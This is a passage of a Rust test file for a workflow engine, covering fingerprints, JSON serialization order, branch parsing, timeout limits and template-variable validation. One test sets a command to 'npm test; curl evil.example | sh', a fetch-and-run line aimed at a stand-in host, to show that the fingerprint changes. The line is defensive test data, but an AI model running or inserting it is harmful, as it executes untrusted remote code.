//! Ports of `workflow.test.ts` and `workflowParse.test.ts`, plus the Rust-specific checks
//! (JSON shape, order, fingerprint parity with the React code, matchers).
use super::condition::{condition_syntax_problem, eval_condition, parse_condition, Operand};
use super::fixtures::*;
use super::model::*;
use super::ordered::{js_number_text, Json, OrderedMap};
use super::output::{output_instruction, output_reask, parse_workflow_output, OUTPUT_FENCE};
use super::parse::{parse_workflows, read_workflow_file};
use super::template::{
    lookup, render_template, shell_dash_problems, shell_quote, shell_template_problems,
    template_vars,
};
use super::validate::{find_absolute_path, validate_workflow, WorkflowIssue};
use serde_json::{json, Value};

fn messages(w: &Workflow) -> Vec<String> {
    validate_workflow(w)
        .into_iter()
        .map(|i| i.message)
        .collect()
}

fn flags(w: &Workflow, phrase: &str) -> bool {
    validate_workflow(w)
        .iter()
        .any(|i| i.message.contains(phrase))
}

fn issue_node<'a>(issues: &'a [WorkflowIssue], phrase: &str) -> Option<&'a str> {
    issues
        .iter()
        .find(|i| i.message.contains(phrase))
        .and_then(|i| i.node_id.as_deref())
}

fn node_mut<'a>(w: &'a mut Workflow, id: &str) -> &'a mut Node {
    w.nodes.iter_mut().find(|n| n.id == id).unwrap()
}

fn set_report_template(w: &mut Workflow, text: &str) {
    match &mut node_mut(w, "report").kind {
        NodeKind::Report { template } => *template = Some(text.to_string()),
        _ => unreachable!(),
    }
}

fn loop_edge(w: &mut Workflow) -> &mut LoopSpec {
    w.edges
        .iter_mut()
        .find_map(|e| e.loop_spec.as_mut())
        .unwrap()
}

fn text(w: &Workflow) -> String {
    serde_json::to_string(w).unwrap()
}

// ---------------------------------------------------------------------------------------------
// workflow.test.ts: definitionFingerprint
// ---------------------------------------------------------------------------------------------

#[test]
fn fingerprint_does_not_change_when_only_board_positions_change() {
    let w = ticket_workflow();
    let mut moved = w.clone();
    for n in &mut moved.nodes {
        n.ui = Some(Ui { x: 500.0, y: 700.0 });
    }
    assert_eq!(definition_fingerprint(&moved), definition_fingerprint(&w));
    let mut unplaced = w.clone();
    for n in &mut unplaced.nodes {
        n.ui = None;
    }
    assert_eq!(
        definition_fingerprint(&unplaced),
        definition_fingerprint(&w)
    );
}

#[test]
fn fingerprint_changes_when_a_command_changes() {
    let mut w = ticket_workflow();
    w.nodes = vec![
        node(r#"{"id":"trigger","type":"manual"}"#),
        node(
            r#"{"id":"build","type":"command","project":"{{inputs.project}}","command":"npm test"}"#,
        ),
        node(r#"{"id":"report","type":"report"}"#),
    ];
    w.edges = vec![
        edge(r#"{"from":"trigger","to":"build"}"#),
        edge(r#"{"from":"build","to":"report"}"#),
    ];
    let mut edited = w.clone();
    match &mut node_mut(&mut edited, "build").kind {
        NodeKind::Command { command, .. } => *command = "npm test; curl evil.example | sh".into(),
        _ => unreachable!(),
    }
    assert_ne!(definition_fingerprint(&edited), definition_fingerprint(&w));
}

#[test]
fn fingerprint_changes_with_a_prompt_a_title_a_loop_the_name_the_description_or_an_input() {
    let w = ticket_workflow();
    let base = definition_fingerprint(&w);
    let prompt = patch_node(&w, "dev", r#"{"prompt":"Do other things"}"#);
    let title = patch_node(&w, "dev", r#"{"title":"Totally safe"}"#);
    let mut looped = w.clone();
    *loop_edge(&mut looped) = LoopSpec {
        max_rounds: 9.0,
        decide: "mono".into(),
    };
    let mut renamed = w.clone();
    renamed.name = "Other".into();
    let mut described = w.clone();
    described.description = Some("Different".into());
    let mut extra = w.clone();
    extra
        .inputs
        .insert("extra", WorkflowInput::new(InputType::String));
    for changed in [prompt, title, looped, renamed, described, extra] {
        assert_ne!(definition_fingerprint(&changed), base);
    }
}

#[test]
fn fingerprint_does_not_depend_on_the_order_of_keys() {
    let w = ticket_workflow();
    // Reverse the member order of every object in the stored text, then read it back.
    fn reversed(value: &Json) -> Json {
        match value {
            Json::Object(map) => {
                let mut items: Vec<_> = map.iter().map(|(k, v)| (k.clone(), reversed(v))).collect();
                items.reverse();
                Json::Object(items.into_iter().collect())
            }
            Json::Array(items) => Json::Array(items.iter().map(reversed).collect()),
            other => other.clone(),
        }
    }
    let flipped = serde_json::to_string(&reversed(&json(&text(&w)))).unwrap();
    let reordered = workflow_from(&flipped);
    assert_eq!(
        definition_fingerprint(&reordered),
        definition_fingerprint(&w)
    );
}

#[test]
fn fingerprint_ignores_input_values_and_runtime_fields() {
    let w = ticket_workflow();
    let mut running = w.clone();
    running.input_values = [
        ("project", InputValue::String("/elsewhere".into())),
        ("clickupList", InputValue::String("Other".into())),
    ]
    .into_iter()
    .collect();
    running.enabled = !w.enabled;
    running.next_run_at = Some(123);
    running.run_requested = true;
    running.last_run_id = Some("run-9".into());
    running.needs_review = true;
    assert_eq!(definition_fingerprint(&running), definition_fingerprint(&w));
}

#[test]
fn fingerprint_equals_the_react_output_for_the_same_definition() {
    // The expected strings were produced by running `definitionFingerprint` from workflow.ts.
    assert_eq!(
        definition_fingerprint(&workflow_from(SINK_JSON)),
        SINK_FINGERPRINT
    );
    assert_eq!(definition_fingerprint(&example()), EXAMPLE_FINGERPRINT);
    assert_eq!(
        definition_fingerprint(&ticket_workflow()),
        TICKET_FINGERPRINT
    );
}

// ---------------------------------------------------------------------------------------------
// Rust-specific: shapes shared with the React app
// ---------------------------------------------------------------------------------------------

#[test]
fn a_workflow_serializes_to_the_json_the_react_app_writes() {
    for source in [EXAMPLE_JSON, TICKET_JSON, SINK_JSON] {
        let expected: Value = serde_json::from_str(source).unwrap();
        let w = workflow_from(source);
        let mut written = serde_json::to_value(&w).unwrap();
        // The fixtures carry the managed fields only when set; absent ones stay absent.
        assert_eq!(written["enabled"], expected["enabled"]);
        written.as_object_mut().unwrap().remove("inputValues");
        let mut expected = expected;
        expected.as_object_mut().unwrap().remove("inputValues");
        assert_eq!(written, expected);
    }
}

#[test]
fn a_node_writes_its_base_fields_then_its_type() {
    let n =
        node(r#"{"id":"fetch","title":"T","parent":"each","ui":{"x":1,"y":2},"type":"manual"}"#);
    assert_eq!(
        serde_json::to_string(&n).unwrap(),
        r#"{"id":"fetch","title":"T","parent":"each","ui":{"x":1,"y":2},"type":"manual"}"#
    );
    let c = node(
        r#"{"id":"c","type":"command","project":"p","command":"x","cwd":"root","timeoutMinutes":10}"#,
    );
    assert_eq!(
        serde_json::to_string(&c).unwrap(),
        r#"{"id":"c","type":"command","project":"p","command":"x","cwd":"root","timeoutMinutes":10}"#
    );
    let e = edge(r#"{"from":"a","to":"b","handle":"true"}"#);
    assert_eq!(
        serde_json::to_string(&e).unwrap(),
        r#"{"from":"a","to":"b","handle":"true"}"#
    );
}

#[test]
fn inputs_and_output_fields_keep_the_order_they_were_written_in() {
    let w = workflow_from(SINK_JSON);
    assert_eq!(
        w.inputs.keys().collect::<Vec<_>>(),
        ["zeta", "project", "count", "flag"]
    );
    let NodeKind::Session { output, .. } = &w.node("fetch").unwrap().kind else {
        unreachable!()
    };
    assert_eq!(output.keys().collect::<Vec<_>>(), ["b", "a"]);
    let again = workflow_from(&text(&w));
    assert_eq!(
        again.inputs.keys().collect::<Vec<_>>(),
        ["zeta", "project", "count", "flag"]
    );
    assert_eq!(again, w);
}

#[test]
fn numbers_keep_their_json_form() {
    let w = workflow_from(SINK_JSON);
    let out = text(&w);
    assert!(out.contains(r#""timeoutMinutes":30,"#) || out.contains(r#""timeoutMinutes":30}"#));
    assert!(out.contains(r#""timeoutMinutes":1.5"#));
    assert!(out.contains(r#""x":-16.5"#));
    assert!(out.contains(r#""createdAt":1700000000000"#));
    assert!(out.contains(r#""count":2.5"#));
}

#[test]
fn a_workflow_read_through_serde_is_parsed_leniently() {
    let w: Workflow = serde_json::from_str(EXAMPLE_JSON).unwrap();
    assert_eq!(w, example());
    assert!(serde_json::from_str::<Workflow>(r#"{"name":"x"}"#).is_err());
    let bare: Workflow = serde_json::from_str(r#"{"id":"wf-aaaaaaaa","nodes":[]}"#).unwrap();
    assert_eq!(bare.name, "");
}

#[test]
fn a_run_round_trips_with_string_session_ids() {
    let raw = json!({
        "id": "run-1", "workflowId": "wf-abcd1234",
        "definition": serde_json::from_str::<Value>(EXAMPLE_JSON).unwrap(),
        "status": "doneWithFailures", "startedAt": 5, "endedAt": 9, "trigger": "cli",
        "folderId": "f1",
        "items": { "each": [{"title": "a"}], "each@r1": [] },
        "nodes": [{
            "nodeId": "dev", "branch": "each#0", "status": "waitingApproval", "round": 2,
            "sessionId": "abc-123", "reuseSessionId": "def", "output": {"pr_url": "x"},
            "decision": {"value": "yes", "reason": "ok"}, "startedAt": 6, "reasked": true,
            "history": [{"round": 1, "status": "done", "sessionId": "old", "endedAt": 7}]
        }],
        "reportPostedAt": 10, "error": "boom"
    });
    let run: WorkflowRun = serde_json::from_value(raw.clone()).unwrap();
    assert_eq!(run.nodes[0].session_id.as_deref(), Some("abc-123"));
    assert_eq!(run.status, RunStatus::DoneWithFailures);
    assert_eq!(run.trigger, RunTrigger::Cli);
    let mut back = serde_json::to_value(&run).unwrap();
    // The definition is re-written from the lenient parse, which adds nothing the fixture lacks.
    assert_eq!(back["definition"], raw["definition"]);
    back["definition"] = raw["definition"].clone();
    assert_eq!(back, raw);
}

// ---------------------------------------------------------------------------------------------
// Ids, branches
// ---------------------------------------------------------------------------------------------

#[test]
fn new_workflow_id_is_wf_plus_8_base36_chars() {
    for _ in 0..50 {
        let id = new_workflow_id();
        assert_eq!(id.len(), 11);
        assert!(id.starts_with("wf-"));
        assert!(id[3..]
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit()));
    }
}

#[test]
fn trigger_of_finds_the_trigger() {
    assert_eq!(
        trigger_of(&example()).map(|n| n.id.as_str()),
        Some("trigger")
    );
    assert!(trigger_of(&Workflow::new("wf-aaaaaaaa", "x")).is_none());
}

#[test]
fn node_ids_follow_the_pattern() {
    for ok in ["a", "fetch", "a_1", &"a".repeat(40)] {
        assert!(is_node_id(ok), "{ok}");
    }
    for bad in ["", "A", "1a", "a-b", "a b", "_a", &"a".repeat(41), "é"] {
        assert!(!is_node_id(bad), "{bad}");
    }
}

#[test]
fn branch_keys_parse_and_archive() {
    assert_eq!(parse_branch(""), None);
    assert_eq!(parse_branch("each"), None);
    assert_eq!(
        parse_branch("each#3"),
        Some(Branch {
            group_id: "each".into(),
            index: 3,
            round: None
        })
    );
    assert_eq!(
        parse_branch("each#3@r2"),
        Some(Branch {
            group_id: "each".into(),
            index: 3,
            round: Some(2)
        })
    );
    // The group id is whatever precedes the last `#`.
    assert_eq!(
        parse_branch("a#1#2").map(|b| (b.group_id, b.index)),
        Some(("a#1".into(), 2))
    );
    for bad in [
        "#1",
        "each#",
        "each#x",
        "each#1@r",
        "each#1@rx",
        "each#1@2",
        "each#1x",
        "a\nb#1",
    ] {
        assert_eq!(parse_branch(bad), None, "{bad}");
    }
    assert!(!is_archived_branch("each#3"));
    assert!(is_archived_branch("each#3@r2"));
    assert!(!is_archived_branch(""));
    assert_eq!(archived_branch("each#3", 2), "each#3@r2");
    assert_eq!(archived_items_key("each", 2), "each@r2");
    assert_eq!(
        parse_branch(&archived_branch("each#3", 2)).unwrap().round,
        Some(2)
    );
}

// ---------------------------------------------------------------------------------------------
// workflowParse.test.ts: timeout limits
// ---------------------------------------------------------------------------------------------

#[test]
fn accepts_timeouts_up_to_24_hours_on_session_and_command_nodes() {
    let w = patch_node(
        &with_command("npm test"),
        "fetch",
        r#"{"timeoutMinutes":1440}"#,
    );
    assert_eq!(
        messages(&patch_node(&w, "lint", r#"{"timeoutMinutes":1440}"#)),
        Vec::<String>::new()
    );
}

#[test]
fn rejects_a_session_timeout_above_24_hours() {
    let issues = messages(&patch_node(
        &example(),
        "fetch",
        r#"{"timeoutMinutes":1441}"#,
    ));
    assert_eq!(issues.len(), 1);
    assert!(issues[0].contains("1440"));
    assert!(issues[0].contains("timeoutMinutes"));
}

#[test]
fn rejects_a_command_timeout_above_24_hours() {
    assert!(flags(
        &patch_node(
            &with_command("npm test"),
            "lint",
            r#"{"timeoutMinutes":1e6}"#
        ),
        "1440"
    ));
}

#[test]
fn names_the_node_in_the_timeout_issue() {
    let w = patch_node(&example(), "fetch", r#"{"timeoutMinutes":5000}"#);
    assert_eq!(issue_node(&validate_workflow(&w), "1440"), Some("fetch"));
}

#[test]
fn timeouts_of_zero_or_less_are_rejected() {
    for bad in ["0", "-5"] {
        let w = patch_node(
            &example(),
            "fetch",
            &format!(r#"{{"timeoutMinutes":{bad}}}"#),
        );
        assert_eq!(messages(&w), ["timeoutMinutes must be greater than 0"]);
    }
}

// ---------------------------------------------------------------------------------------------
// parseWorkflows
// ---------------------------------------------------------------------------------------------

#[test]
fn parses_a_valid_clickup_workflow() {
    let w = example();
    assert_eq!(
        parse_workflows(&serde_json::to_string(&[&w]).unwrap()),
        vec![w.clone()]
    );
    assert_eq!(
        parse_workflows(&serde_json::to_string_pretty(&[&w]).unwrap()),
        vec![w]
    );
}

#[test]
fn drops_entries_without_id_or_nodes() {
    assert!(parse_workflows(r#"[{"name":"x"}]"#).is_empty());
    assert!(parse_workflows(r#"[{"id":"wf-aaaaaaaa","name":"x"}]"#).is_empty());
    assert!(parse_workflows(r#"[{"nodes":[]}]"#).is_empty());
    assert!(parse_workflows("not json").is_empty());
    assert!(parse_workflows("").is_empty());
    assert!(parse_workflows(r#"{"id":"wf-aaaaaaaa"}"#).is_empty());
}

#[test]
fn keeps_good_entries_next_to_malformed_ones() {
    let good = example();
    let body = format!(
        r#"[null, 4, {{"id":"wf-zzzzzzzz","nodes":[{{"id":"a"}}]}}, {}]"#,
        serde_json::to_string(&good).unwrap()
    );
    assert_eq!(parse_workflows(&body), vec![good]);
}

#[test]
fn fills_defaults_for_a_bare_entry() {
    let ws = parse_workflows(r#"[{"id":"wf-aaaaaaaa","nodes":[{"id":"t","type":"manual"}]}]"#);
    let w = &ws[0];
    assert_eq!(w.id, "wf-aaaaaaaa");
    assert_eq!(w.name, "");
    assert!(w.inputs.is_empty() && w.input_values.is_empty() && w.edges.is_empty());
    assert!(!w.enabled);
    assert_eq!(w.created_at, 0);
}

#[test]
fn needs_review_is_kept_when_true_and_dropped_otherwise() {
    let entry = |extra: &str| {
        format!(
            r#"[{{"id":"wf-abcd1234","name":"x","nodes":[{{"id":"trigger","type":"manual"}}],"edges":[]{extra}}}]"#
        )
    };
    assert!(parse_workflows(&entry(r#","needsReview":true"#))[0].needs_review);
    for extra in [r#","needsReview":false"#, r#","needsReview":"yes""#, ""] {
        let w = &parse_workflows(&entry(extra))[0];
        assert!(!w.needs_review);
        assert!(!text(w).contains("needsReview"));
    }
}

#[test]
fn managed_flags_are_kept_only_when_true() {
    let w = &parse_workflows(
        r#"[{"id":"wf-abcd1234","nodes":[],"enabled":true,"runRequested":true,"stopRequested":true,
            "resumeRunId":"r1","lastRunId":"r2","importedFrom":"x.yaml","nextRunAt":99,"createdAt":5}]"#,
    )[0];
    assert!(w.enabled && w.run_requested && w.stop_requested);
    assert_eq!(
        (
            w.resume_run_id.as_deref(),
            w.last_run_id.as_deref(),
            w.imported_from.as_deref(),
            w.next_run_at,
            w.created_at
        ),
        (Some("r1"), Some("r2"), Some("x.yaml"), Some(99), 5)
    );
    let off = &parse_workflows(
        r#"[{"id":"wf-abcd1234","nodes":[],"enabled":"true","runRequested":false}]"#,
    )[0];
    assert!(!off.enabled && !off.run_requested);
}

#[test]
fn read_workflow_file_splits_readable_from_unreadable_entries() {
    let good = text(&example());
    let odd = r#"{"id":"wf-other001","nodes":[{"id":"x","type":"mystery","extra":[1,2]}]}"#;
    let dup = text(&example());
    let file = read_workflow_file(&format!("[{good},{odd},{dup},7]")).unwrap();
    assert_eq!(file.workflows, vec![example()]);
    // Unreadable entries come back as they were written, key order included.
    assert_eq!(file.unreadable.len(), 3);
    assert_eq!(serde_json::to_string(&file.unreadable[0]).unwrap(), odd);
    assert_eq!(file.unreadable[1], json(&dup));
    assert_eq!(file.unreadable[2], Json::Number(7.0));
}

#[test]
fn read_workflow_file_refuses_what_is_not_a_list() {
    assert!(read_workflow_file("not json").is_none());
    assert!(read_workflow_file(r#"{"id":"wf-aaaaaaaa"}"#).is_none());
    assert!(read_workflow_file("4").is_none());
    for blank in ["", "  \n\t "] {
        let file = read_workflow_file(blank).unwrap();
        assert!(file.workflows.is_empty() && file.unreadable.is_empty());
    }
    assert!(read_workflow_file("[]").unwrap().workflows.is_empty());
}

#[test]
fn a_node_or_edge_that_cannot_be_read_makes_the_entry_unreadable() {
    let node_ok = r#"{"id":"t","type":"manual"}"#;
    for (nodes, edges) in [
        (format!("[{node_ok},{{\"id\":\"s\",\"type\":\"session\",\"project\":\"p\"}}]"), "[]"),
        (format!("[{node_ok},{{\"id\":\"c\",\"type\":\"command\",\"project\":\"p\"}}]"), "[]"),
        (format!("[{node_ok},{{\"id\":\"s\",\"type\":\"session\",\"project\":\"p\",\"prompt\":\"x\",\"checkout\":\"elsewhere\"}}]"), "[]"),
        (format!("[{node_ok},{{\"id\":\"a\",\"type\":\"askMono\",\"question\":\"q\"}}]"), "[]"),
        (format!("[{node_ok},{{\"id\":\"f\",\"type\":\"forEach\"}}]"), "[]"),
        (format!("[{node_ok},{{\"id\":\"s\",\"type\":\"schedule\"}}]"), "[]"),
        (format!("[{node_ok},{{\"id\":\"s\",\"type\":\"schedule\",\"schedule\":{{\"scheduleKind\":\"\"}}}}]"), "[]"),
        (format!("[{node_ok},{{\"type\":\"manual\"}}]"), "[]"),
        (format!("[{node_ok},{{\"id\":\"\",\"type\":\"manual\"}}]"), "[]"),
        (format!("[{node_ok},{{\"id\":\"q\",\"type\":\"nope\"}}]"), "[]"),
        (format!("[{node_ok},5]"), "[]"),
        (format!("[{node_ok}]"), r#"[{"from":"t"}]"#),
        (format!("[{node_ok}]"), r#"[{"from":"t","to":"t","loop":{"maxRounds":"3","decide":"mono"}}]"#),
        (format!("[{node_ok}]"), r#"[{"from":"t","to":"t","loop":null}]"#),
        (format!("[{node_ok}]"), "[3]"),
    ] {
        let body = format!(r#"[{{"id":"wf-aaaaaaaa","nodes":{nodes},"edges":{edges}}}]"#);
        let file = read_workflow_file(&body).unwrap();
        assert!(file.workflows.is_empty(), "{body}");
        assert_eq!(file.unreadable.len(), 1, "{body}");
    }
}

#[test]
fn lenient_parts_that_are_dropped_not_fatal() {
    let n = node(
        r#"{"id":"s","type":"session","project":"p","prompt":"x","checkout":"root",
            "output":{"ok":{"type":"string"},"bad name":{"type":"string"},"weird":{"type":"nope"},"flat":"x"},
            "reuseSession":"yes","timeoutMinutes":"5","title":7,"ui":{"x":1}}"#,
    );
    let NodeKind::Session {
        output,
        reuse_session,
        timeout_minutes,
        ..
    } = &n.kind
    else {
        unreachable!()
    };
    assert_eq!(output.keys().collect::<Vec<_>>(), ["ok"]);
    assert_eq!(
        (*reuse_session, *timeout_minutes, n.title.clone(), n.ui),
        (None, None, None, None)
    );
    let c = node(r#"{"id":"c","type":"command","project":"p","command":"x","cwd":"elsewhere"}"#);
    assert!(matches!(c.kind, NodeKind::Command { cwd: None, .. }));
    let a = node(r#"{"id":"a","type":"askMono","question":"q","answers":["a",3,null,"b"]}"#);
    assert!(matches!(&a.kind, NodeKind::AskMono { answers, .. } if answers == &["a", "b"]));
    let i = node(r#"{"id":"i","type":"if","decide":"human"}"#);
    assert!(matches!(i.kind, NodeKind::If { decide: None, .. }));
    let e = edge(r#"{"from":"a","to":"b","handle":"maybe"}"#);
    // Any handle is kept: a switch edge carries a case name, and validation judges it.
    assert_eq!(e.handle, Some(Handle::Case("maybe".into())));
    let no_output =
        node(r#"{"id":"s","type":"session","project":"p","prompt":"x","checkout":"root"}"#);
    assert!(matches!(&no_output.kind, NodeKind::Session { output, .. } if output.is_empty()));
    let bad_output = parse_workflows(
        r#"[{"id":"wf-aaaaaaaa","nodes":[{"id":"s","type":"session","project":"p","prompt":"x","checkout":"root","output":[]}]}]"#,
    );
    assert!(bad_output.is_empty());
}

#[test]
fn a_repeated_key_keeps_the_last_value_at_the_first_position() {
    let Json::Object(map) = json(r#"{"a":1,"b":2,"a":3}"#) else {
        unreachable!()
    };
    assert_eq!(
        map.iter()
            .map(|(k, v)| (k.as_str(), v.as_f64()))
            .collect::<Vec<_>>(),
        [("a", Some(3.0)), ("b", Some(2.0))]
    );
}

// ---------------------------------------------------------------------------------------------
// validateWorkflow
// ---------------------------------------------------------------------------------------------

#[test]
fn accepts_loop_review_to_dev_inside_for_each() {
    assert_eq!(validate_workflow(&example()), vec![]);
}

#[test]
fn flags_two_triggers() {
    let mut w = example();
    w.nodes.push(node(r#"{"id":"again","type":"manual"}"#));
    assert!(flags(&w, "exactly one trigger"));
}

#[test]
fn flags_no_trigger() {
    let mut w = example();
    w.nodes.retain(|n| n.id != "trigger");
    w.edges.retain(|e| e.from != "trigger");
    assert!(flags(&w, "exactly one trigger"));
    assert!(messages(&w).contains(&"A workflow needs exactly one trigger (found 0)".to_string()));
}

#[test]
fn flags_missing_report() {
    let mut w = example();
    w.nodes.retain(|n| n.id != "report");
    w.edges.retain(|e| e.to != "report");
    assert!(flags(&w, "exactly one Report node"));
}

#[test]
fn flags_two_report_nodes() {
    let mut w = example();
    w.nodes.push(node(r#"{"id":"report2","type":"report"}"#));
    assert!(flags(&w, "exactly one Report node"));
}

#[test]
fn flags_a_report_the_trigger_cannot_reach() {
    let mut w = example();
    w.edges.retain(|e| e.to != "report");
    assert!(flags(&w, "reachable from the trigger"));
    assert_eq!(
        issue_node(&validate_workflow(&w), "reachable from the trigger"),
        Some("report")
    );
}

#[test]
fn flags_a_plain_cycle_without_loop() {
    let mut w = example();
    w.edges.push(edge(r#"{"from":"review","to":"dev"}"#));
    assert!(flags(&w, "cycle"));
    assert!(messages(&w)
        .contains(&"The workflow has a cycle without a loop edge (dev, review); declare a loop edge to repeat steps".to_string()));
}

#[test]
fn flags_a_loop_edge_to_a_non_ancestor() {
    let mut w = example();
    w.edges.retain(|e| e.loop_spec.is_none());
    w.edges.push(edge(
        r#"{"from":"dev","to":"review","loop":{"maxRounds":3,"decide":"mono"}}"#,
    ));
    assert!(flags(&w, "ancestor"));
}

#[test]
fn flags_a_loop_edge_that_crosses_a_for_each_boundary() {
    let mut w = example();
    w.edges.retain(|e| e.loop_spec.is_none());
    w.edges.push(edge(
        r#"{"from":"review","to":"fetch","loop":{"maxRounds":3,"decide":"mono"}}"#,
    ));
    assert!(flags(&w, "same For each"));
}

#[test]
fn flags_a_loop_edge_that_starts_at_a_node_that_cannot_loop() {
    let mut w = example();
    w.edges.retain(|e| e.loop_spec.is_none());
    w.edges.push(edge(
        r#"{"from":"each","to":"fetch","loop":{"maxRounds":3,"decide":"mono"}}"#,
    ));
    assert!(flags(&w, "session, command or Ask Mono"));
    let mut t = example();
    t.edges.retain(|e| e.loop_spec.is_none());
    t.edges.push(edge(
        r#"{"from":"trigger","to":"trigger","loop":{"maxRounds":3,"decide":"mono"}}"#,
    ));
    assert!(flags(&t, "session, command or Ask Mono"));
}

#[test]
fn flags_a_node_that_is_the_source_of_two_loop_edges() {
    let mut w = example();
    w.edges.push(edge(
        r#"{"from":"review","to":"dev","loop":{"maxRounds":2,"decide":"mono"}}"#,
    ));
    assert_eq!(
        messages(&w)
            .iter()
            .filter(|m| m.contains("more than one loop edge"))
            .count(),
        1
    );
}

#[test]
fn flags_a_report_node_with_outgoing_edges_or_a_parent() {
    let mut w = example();
    w.nodes.push(node(
        r#"{"id":"after","type":"command","project":"{{inputs.project}}","command":"true"}"#,
    ));
    w.edges.push(edge(r#"{"from":"report","to":"after"}"#));
    assert!(flags(&w, "leaves the Report node"));
    assert!(flags(
        &patch_node(&example(), "report", r#"{"parent":"each"}"#),
        "cannot be inside a For each"
    ));
}

#[test]
fn flags_max_rounds_11() {
    let mut w = example();
    loop_edge(&mut w).max_rounds = 11.0;
    assert!(flags(&w, "maxRounds"));
    loop_edge(&mut w).max_rounds = 2.5;
    assert!(flags(&w, "maxRounds must be a whole number from 1 to 10"));
    loop_edge(&mut w).max_rounds = 0.0;
    assert!(flags(&w, "maxRounds"));
}

#[test]
fn flags_max_parallel_out_of_range() {
    assert!(flags(
        &patch_node(&example(), "each", r#"{"maxParallel":11}"#),
        "maxParallel"
    ));
    assert!(flags(
        &patch_node(&example(), "each", r#"{"maxParallel":0}"#),
        "maxParallel"
    ));
    assert!(flags(
        &patch_node(&example(), "each", r#"{"maxParallel":2.5}"#),
        "maxParallel"
    ));
    assert!(!flags(
        &patch_node(&example(), "each", r#"{"maxParallel":10}"#),
        "maxParallel"
    ));
}

#[test]
fn flags_unknown_dev_nope() {
    let w = patch_node(&example(), "review", r#"{"prompt":"Review {{dev.nope}}."}"#);
    assert!(flags(&w, "{{dev.nope}}"));
    assert!(messages(&w).contains(&r#"{{dev.nope}}: "dev" has no output field "nope""#.to_string()));
}

#[test]
fn flags_a_variable_that_names_no_node_input_or_item() {
    let w = patch_node(&example(), "fetch", r#"{"prompt":"Hello {{ghost.value}}"}"#);
    assert!(flags(&w, "{{ghost.value}}"));
    assert!(messages(&w).contains(
        &"{{ghost.value}} is unknown: it names no input, upstream node or loop variable"
            .to_string()
    ));
}

#[test]
fn flags_an_undeclared_input() {
    let w = patch_node(&example(), "fetch", r#"{"prompt":"List {{inputs.nope}}"}"#);
    assert!(flags(&w, "{{inputs.nope}}"));
    assert!(messages(&w).contains(&"{{inputs.nope}} does not name a declared input".to_string()));
}

#[test]
fn flags_a_node_that_is_not_upstream() {
    let w = patch_node(&example(), "fetch", r#"{"prompt":"Use {{dev.pr_url}}"}"#);
    assert!(flags(&w, "not upstream"));
    assert!(messages(&w).contains(
        &r#"{{dev.pr_url}} refers to "dev", which is not upstream of this node"#.to_string()
    ));
}

#[test]
fn flags_item_outside_a_for_each() {
    let w = patch_node(&example(), "fetch", r#"{"prompt":"Use {{item.title}}"}"#);
    assert!(flags(&w, "{{item.title}}"));
}

#[test]
fn uses_the_for_each_as_name_for_the_loop_variable() {
    let mut w = patch_node(&example(), "each", r#"{"as":"ticket"}"#);
    assert!(flags(&w, "{{item.title}}"));
    w = patch_node(
        &w,
        "dev",
        r#"{"prompt":"Implement {{ticket.title}}.\n{{#if review}}{{review.issues}}{{/if}}"}"#,
    );
    assert_eq!(validate_workflow(&w), vec![]);
}

#[test]
fn accepts_run_round_run_id_and_run_started_at_anywhere() {
    let w = patch_node(
        &example(),
        "fetch",
        r#"{"prompt":"Round {{run.round}} of {{run.id}} started {{run.startedAt}}"}"#,
    );
    assert_eq!(validate_workflow(&w), vec![]);
    let bad = patch_node(&example(), "fetch", r#"{"prompt":"{{run.nope}}"}"#);
    assert!(flags(&bad, "{{run.nope}}"));
    assert!(messages(&bad).contains(
        &"{{run.nope}} is not a run variable (use run.round, run.id, run.startedAt)".to_string()
    ));
}

#[test]
fn resolves_command_outputs_ask_mono_outputs_and_for_each_results() {
    let mut w = example();
    w.nodes.push(node(
        r#"{"id":"lint","type":"command","project":"{{inputs.project}}","command":"make lint"}"#,
    ));
    w.nodes.push(node(r#"{"id":"ask","type":"askMono","question":"Exit {{lint.exitCode}}?","answers":["yes","no"]}"#));
    w.edges.push(edge(r#"{"from":"fetch","to":"lint"}"#));
    w.edges.push(edge(r#"{"from":"lint","to":"ask"}"#));
    w.edges.push(edge(r#"{"from":"ask","to":"report"}"#));
    set_report_template(
        &mut w,
        "{{ask.answer}} {{ask.reason}} {{each.results}} {{lint.stderr}}",
    );
    assert_eq!(validate_workflow(&w), vec![]);
    assert!(flags(
        &patch_node(&w, "ask", r#"{"question":"{{lint.nope}}"}"#),
        "{{lint.nope}}"
    ));
}

#[test]
fn accepts_a_report_reading_a_top_level_session_upstream_through_an_if() {
    let w = workflow_from(
        r#"{
          "id": "wf-weather1", "name": "Weather",
          "inputs": { "project": { "type": "project" } },
          "inputValues": { "project": "/Users/x/repo" },
          "nodes": [
            { "id": "trigger", "type": "manual" },
            { "id": "session", "type": "session", "project": "{{inputs.project}}", "checkout": "root",
              "prompt": "Do session", "output": { "weather": { "type": "string" }, "summary": { "type": "string" } } },
            { "id": "gate", "type": "if", "condition": "{{session.weather}} == \"rain\"" },
            { "id": "session_2", "type": "session", "project": "{{inputs.project}}", "checkout": "root",
              "prompt": "Do session_2", "output": {} },
            { "id": "session_3", "type": "session", "project": "{{inputs.project}}", "checkout": "root",
              "prompt": "Do session_3", "output": {} },
            { "id": "report", "type": "report",
              "template": "Da Nang: {{session.weather}}. {{session.summary}} ({{run.status}})" }
          ],
          "edges": [
            { "from": "trigger", "to": "session" },
            { "from": "session", "to": "gate" },
            { "from": "gate", "to": "session_2", "handle": "true" },
            { "from": "gate", "to": "session_3", "handle": "false" },
            { "from": "session_2", "to": "report" },
            { "from": "session_3", "to": "report" }
          ],
          "enabled": true, "createdAt": 1
        }"#,
    );
    assert_eq!(validate_workflow(&w), vec![]);
}

#[test]
fn rejects_reserved_names_as_a_for_each_loop_variable() {
    for name in ["results", "run", "inputs"] {
        let w = patch_node(&example(), "each", &format!(r#"{{"as":"{name}"}}"#));
        assert!(flags(&w, "Invalid loop variable name"), "{name}");
    }
    // A node id or a malformed name is no loop variable either.
    assert!(flags(
        &patch_node(&example(), "each", r#"{"as":"fetch"}"#),
        "Invalid loop variable name"
    ));
    assert!(flags(
        &patch_node(&example(), "each", r#"{"as":"a b"}"#),
        "Invalid loop variable name"
    ));
}

#[test]
fn keeps_the_extra_run_fields_out_of_non_report_templates() {
    let w = patch_node(&example(), "fetch", r#"{"prompt":"{{run.status}}"}"#);
    assert!(flags(&w, "{{run.status}}"));
}

#[test]
fn limits_report_templates_to_variables_the_report_can_read() {
    let with_template = |template: &str| {
        let mut w = example();
        set_report_template(&mut w, template);
        w
    };
    // Readable: inputs, run, results (and its fields), top-level nodes with a declared field.
    let ok = with_template(
